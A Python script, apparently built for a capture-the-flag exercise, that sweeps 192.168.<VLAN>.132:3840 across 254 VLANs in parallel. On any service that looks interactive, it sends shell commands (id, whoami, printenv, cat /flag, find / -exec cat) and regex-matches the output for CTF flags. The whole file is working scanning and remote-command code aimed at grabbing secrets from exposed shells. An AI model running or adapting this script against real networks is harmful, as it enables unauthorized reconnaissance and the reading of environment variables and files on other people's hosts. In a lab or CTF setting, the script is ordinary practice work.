#!/usr/bin/env python3
import argparse
import concurrent.futures as cf
import re
import socket
import sys
import time
from typing import Optional, Tuple

FLAG_PATTERNS = [
    re.compile(rb'(flag\{[^\n\r}]{0,300}\})', re.I),
    re.compile(rb'([A-Z0-9_]*FLAG\{[^\n\r}]{0,300}\})', re.I),
    re.compile(rb'([A-Za-z0-9_\-]*ctf\{[^\n\r}]{0,300}\})', re.I),
    re.compile(rb'((?:HTB|THM|picoCTF|ictf|nite|uiuctf|corctf|amateurs|buckeye|vsctf)\{[^\n\r}]{0,300}\})', re.I),
]

SHELL_PROMPTS = [b'$ ', b'# ', b'> ', b':~$', b'/ #', b'sh-']
COMMON_COMMANDS = [
    b'help\n',
    b'?\n',
    b'id\n',
    b'whoami\n',
    b'uname -a\n',
    b'pwd\n',
    b'ls\n',
    b'ls -la\n',
    b'printenv\n',
    b'cat flag\n',
    b'cat flag.txt\n',
    b'cat /flag\n',
    b'cat /flag.txt\n',
    b'find / -maxdepth 3 -iname "flag*" 2>/dev/null\n',
    b'find / -maxdepth 3 -iname "flag*" -exec cat {} \\; 2>/dev/null\n',
]


def recv_some(sock: socket.socket, timeout: float = 0.8, max_rounds: int = 6) -> bytes:
    sock.settimeout(timeout)
    chunks = []
    for _ in range(max_rounds):
        try:
            data = sock.recv(65535)
            if not data:
                break
            chunks.append(data)
            if any(p in data for p in SHELL_PROMPTS):
                break
        except socket.timeout:
            break
        except OSError:
            break
    return b''.join(chunks)


def find_flag(blob: bytes) -> Optional[str]:
    for pat in FLAG_PATTERNS:
        m = pat.search(blob)
        if m:
            try:
                return m.group(1).decode(errors='replace')
            except Exception:
                return m.group(1).decode('latin1', errors='replace')
    return None


def looks_interesting(blob: bytes) -> bool:
    interesting = [b'flag', b'sh', b'bash', b'buddy', b'command', b'login', b'password', b'menu']
    low = blob.lower()
    return any(x in low for x in interesting) or any(p in blob for p in SHELL_PROMPTS)


def probe_host(vlan_id: int, port: int, connect_timeout: float, io_timeout: float) -> Tuple[int, str, Optional[str], bytes]:
    host = f'192.168.{vlan_id}.132'
    transcript = bytearray()
    try:
        with socket.create_connection((host, port), timeout=connect_timeout) as sock:
            transcript += recv_some(sock, timeout=io_timeout)
            flag = find_flag(transcript)
            if flag:
                return vlan_id, host, flag, bytes(transcript)

            # Wake up line-oriented services.
            for probe in (b'\n', b'hello\n', b'help\n'):
                try:
                    sock.sendall(probe)
                    time.sleep(0.1)
                    transcript += recv_some(sock, timeout=io_timeout)
                    flag = find_flag(transcript)
                    if flag:
                        return vlan_id, host, flag, bytes(transcript)
                except OSError:
                    break

            # If the service looks interactive, try common shell / CTF commands.
            if looks_interesting(transcript):
                for cmd in COMMON_COMMANDS:
                    try:
                        sock.sendall(cmd)
                        time.sleep(0.12)
                        transcript += recv_some(sock, timeout=io_timeout)
                        flag = find_flag(transcript)
                        if flag:
                            return vlan_id, host, flag, bytes(transcript)
                    except OSError:
                        break

            return vlan_id, host, None, bytes(transcript)
    except (socket.timeout, ConnectionRefusedError, OSError):
        return vlan_id, host, None, b''


def main() -> int:
    parser = argparse.ArgumentParser(
        description='Enumerate 192.168.<VLAN>.132:3840, find the live service, and try to recover a flag.'
    )
    parser.add_argument('--start', type=int, default=1, help='First VLAN id to test (default: 1)')
    parser.add_argument('--end', type=int, default=254, help='Last VLAN id to test (default: 254)')
    parser.add_argument('--port', type=int, default=3840, help='Target port (default: 3840)')
    parser.add_argument('--connect-timeout', type=float, default=0.5, help='TCP connect timeout in seconds')
    parser.add_argument('--io-timeout', type=float, default=0.7, help='Read timeout in seconds')
    parser.add_argument('--workers', type=int, default=48, help='Concurrent workers (default: 48)')
    parser.add_argument('--verbose', action='store_true', help='Print banners from responsive hosts')
    args = parser.parse_args()

    found_flag = None
    live_hosts = []

    with cf.ThreadPoolExecutor(max_workers=args.workers) as pool:
        futures = {
            pool.submit(probe_host, vlan, args.port, args.connect_timeout, args.io_timeout): vlan
            for vlan in range(args.start, args.end + 1)
        }
        for fut in cf.as_completed(futures):
            vlan, host, flag, transcript = fut.result()
            if transcript:
                live_hosts.append((vlan, host, transcript))
                banner = transcript[:240].decode(errors='replace').replace('\r', '\\r').replace('\n', '\\n')
                print(f'[+] VLAN {vlan:>3} -> {host}:{args.port} responded')
                if args.verbose and banner:
                    print(f'    banner: {banner}')
            if flag:
                found_flag = (vlan, host, flag, transcript)
                break

    if found_flag:
        vlan, host, flag, transcript = found_flag
        print(f'\n[FLAG] VLAN {vlan} ({host}:{args.port}) -> {flag}')
        print('\n--- transcript start ---')
        sys.stdout.buffer.write(transcript)
        if not transcript.endswith(b'\n'):
            print()
        print('--- transcript end ---')
        return 0

    print('\n[-] No flag recovered automatically.')
    if live_hosts:
        print('[*] Responsive hosts worth manual follow-up:')
        for vlan, host, transcript in sorted(live_hosts):
            preview = transcript[:160].decode(errors='replace').replace('\r', ' ').replace('\n', ' | ')
            print(f'    VLAN {vlan:>3} -> {host}:{args.port} :: {preview}')
    else:
        print('[*] No VLAN responded on that port in the tested range.')
    return 1


if __name__ == '__main__':
    raise SystemExit(main())
